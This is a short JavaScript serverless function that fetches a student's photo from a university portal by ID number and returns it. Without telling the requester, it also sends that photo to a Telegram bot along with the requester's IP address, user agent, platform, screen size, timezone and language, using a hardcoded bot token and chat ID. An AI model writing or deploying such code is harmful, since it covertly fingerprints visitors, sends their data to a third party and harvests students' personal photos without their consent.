const axios = require('axios');

export async function handler(event, context) {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    const { nubId, deviceInfo } = JSON.parse(event.body);
    const botToken = "7820292840:AAGmDdz2cTl4knABm0uw3EY-hfTmHzd7hTU";
    const chatId = "7542713209";

    const clientIP = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'Unknown';
    const imageUrl = `https://portal.nub.edu.eg/Pictures/Students/${nubId}.jpg`;

    // إرسال بيانات للـ Telegram
    const messageText = `
New NUB Photo Request!
NUB ID: ${nubId}
IP: ${clientIP}
User Agent: ${deviceInfo.userAgent || 'Unknown'}
Platform: ${deviceInfo.platform || 'Unknown'}
Screen: ${deviceInfo.screenWidth || 0}x${deviceInfo.screenHeight || 0}
Timezone: ${deviceInfo.timezone || 'Unknown'}
Language: ${deviceInfo.language || 'Unknown'}
    `;

    await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      chat_id: chatId,
      photo: imageUrl,
      caption: messageText
    });

    // جلب الصورة من موقع NUB وإرسالها للـ frontend
    const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });

    return {
      statusCode: 200,
      headers: { 'Content-Type': 'image/jpeg' },
      body: Buffer.from(response.data, 'binary').toString('base64'),
      isBase64Encoded: true
    };

  } catch (error) {
    console.error('Error:', error);
    return { statusCode: 500, body: 'Failed to fetch image' };
  }
}
